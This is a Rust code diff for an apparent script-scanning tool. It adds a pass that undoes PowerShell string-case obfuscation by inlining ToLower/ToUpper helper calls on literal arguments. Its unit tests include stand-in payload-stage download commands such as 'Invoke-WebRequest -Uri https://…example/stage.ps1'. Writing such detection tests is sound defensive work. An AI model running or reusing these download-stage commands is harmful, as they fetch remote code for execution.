@@ -1039,6 +1039,14 @@ static PS_LITERAL_INSERT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_STRING_CASE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(ToLower|ToUpper)\s*\(\s*\)"#,
+    )
+    .expect("ps literal string case extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3529,6 +3537,40 @@ fn expand_literal_insert_extractor_calls(text: &str) -> String {
     out
 }
 
+fn expand_literal_string_case_extractor_calls(text: &str) -> String {
+    let lower = text.to_ascii_lowercase();
+    if !has_literal_extractor_def_signal(&lower)
+        || !(lower.contains(".tolower") || lower.contains(".toupper"))
+        || !text.contains('\'')
+    {
+        return text.to_string();
+    }
+
+    let mut out = text.to_string();
+    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
+        let Some(caps) = PS_LITERAL_STRING_CASE_EXTRACTOR_BODY_RE.captures(&body) else {
+            continue;
+        };
+        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+            continue;
+        };
+        let Some(kind) = caps
+            .get(2)
+            .and_then(|m| PsStringCaseKind::from_method(m.as_str()))
+        else {
+            continue;
+        };
+
+        let param_index = parse_ps_function_param_indices(&params);
+        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+            continue;
+        };
+
+        out = inline_ps_literal_string_case_calls(&out, &name, value_idx, value_var, kind);
+    }
+    out
+}
+
 fn expand_literal_index_extractor_calls(text: &str) -> String {
     let lower = text.to_ascii_lowercase();
     if !has_literal_extractor_def_signal(&lower) || !text.contains('[') || !text.contains('\'') {
@@ -4896,6 +4938,107 @@ fn inline_ps_named_literal_trim_call(
     Some((call_end, format!("'{}'", trimmed.replace('\'', "''"))))
 }
 
+fn inline_ps_literal_string_case_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    value_name: &str,
+    kind: PsStringCaseKind,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut match_count = 0;
+
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_string_case_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    value_name,
+                    kind,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            if value.len() > 8192 {
+                search_from = value_end;
+                continue;
+            }
+            let mut call_end = value_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = value_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+            if value_idx != 0 {
+                search_from = call_end;
+                continue;
+            }
+            let transformed = kind.apply_ascii(&value);
+            let replacement = format!("'{}'", transformed.replace('\'', "''"));
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn inline_ps_named_literal_string_case_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    kind: PsStringCaseKind,
+) -> Option<(usize, String)> {
+    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_str();
+    if value.len() > 8192 {
+        return None;
+    }
+    let transformed = kind.apply_ascii(value);
+    Some((call_end, format!("'{}'", transformed.replace('\'', "''"))))
+}
+
 fn parse_ps_named_static_literal_args(
     text: &str,
     mut pos: usize,
@@ -5066,6 +5209,31 @@ impl PsTrimKind {
             Self::Both => value.trim(),
             Self::Start => value.trim_start(),
             Self::End => value.trim_end(),
+        }
+    }
+}
+
+#[derive(Clone, Copy)]
+enum PsStringCaseKind {
+    Lower,
+    Upper,
+}
+
+impl PsStringCaseKind {
+    fn from_method(method: &str) -> Option<Self> {
+        if method.eq_ignore_ascii_case("tolower") {
+            Some(Self::Lower)
+        } else if method.eq_ignore_ascii_case("toupper") {
+            Some(Self::Upper)
+        } else {
+            None
+        }
+    }
+
+    fn apply_ascii(self, value: &str) -> String {
+        match self {
+            Self::Lower => value.to_ascii_lowercase(),
+            Self::Upper => value.to_ascii_uppercase(),
         }
     }
 }
@@ -5697,6 +5865,9 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.insert_extractor {
                 out = expand_literal_insert_extractor_calls(&out);
             }
+            if signals.string_case_extractor {
+                out = expand_literal_string_case_extractor_calls(&out);
+            }
             if signals.literal_index_extractor {
                 out = expand_literal_index_extractor_calls(&out);
             }
@@ -5816,6 +5987,9 @@ fn expand_obfuscation(text: &str) -> String {
             if signals.insert_extractor {
                 out = expand_literal_insert_extractor_calls(&out);
             }
+            if signals.string_case_extractor {
+                out = expand_literal_string_case_extractor_calls(&out);
+            }
             if signals.literal_index_extractor {
                 out = expand_literal_index_extractor_calls(&out);
             }
@@ -5873,6 +6047,7 @@ struct PsObfuscationSignals {
     substring: bool,
     remove_extractor: bool,
     insert_extractor: bool,
+    string_case_extractor: bool,
     literal_index_extractor: bool,
     split_index: bool,
     embedded_single_quote_assignment: bool,
@@ -5916,6 +6091,8 @@ impl PsObfuscationSignals {
         let substring = lower.contains(".substring");
         let remove_extractor = has_function_def && lower.contains(".remove");
         let insert_extractor = has_function_def && lower.contains(".insert");
+        let string_case_extractor =
+            has_function_def && (lower.contains(".tolower") || lower.contains(".toupper"));
         let literal_index_extractor =
             has_function_def && lower.contains('[') && text.contains('\'');
         let split_index =
@@ -5967,6 +6144,7 @@ impl PsObfuscationSignals {
             substring,
             remove_extractor,
             insert_extractor,
+            string_case_extractor,
             literal_index_extractor,
             split_index,
             embedded_single_quote_assignment,
@@ -6002,6 +6180,7 @@ impl PsObfuscationSignals {
             || self.substring
             || self.remove_extractor
             || self.insert_extractor
+            || self.string_case_extractor
             || self.literal_index_extractor
             || self.split_index
             || self.embedded_single_quote_assignment
@@ -7883,9 +8062,10 @@ mod literal_substring_extractor_tests {
         expand_doubled_quote_literals, expand_literal_index_extractor_calls,
         expand_literal_insert_extractor_calls, expand_literal_remove_extractor_calls,
         expand_literal_replace_extractor_calls, expand_literal_split_index_extractor_calls,
-        expand_literal_substring_extractor_calls, expand_literal_trim_extractor_calls,
-        expand_parenthesized_string_concat, literal_substring_extractor_defs,
-        PS_LITERAL_INDEX_EXTRACTOR_BODY_RE, PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
+        expand_literal_string_case_extractor_calls, expand_literal_substring_extractor_calls,
+        expand_literal_trim_extractor_calls, expand_parenthesized_string_concat,
+        literal_substring_extractor_defs, PS_LITERAL_INDEX_EXTRACTOR_BODY_RE,
+        PS_LITERAL_SUBSTRING_EXTRACTOR_BODY_RE,
     };
 
     #[test]
@@ -8094,6 +8274,21 @@ Add 'InvokeWebRequest -Uri https://ps-insert-extractor.example/stage.ps1' 6 '-'"
         assert!(
             out.contains(&format!("'{decoded}'")),
             "literal insert extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_string_case_extractor_call_is_rewritten() {
+        let text = r#"function Lower($value) {
+  return $value.ToLower()
+}
+Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
+
+        let out = expand_literal_string_case_extractor_calls(text);
+
+        assert!(
+            out.contains("'invoke-webrequest -uri https://ps-lower-extractor.example/stage.ps1'"),
+            "literal string-case extractor call was not rewritten:\n{out}"
         );
     }
 
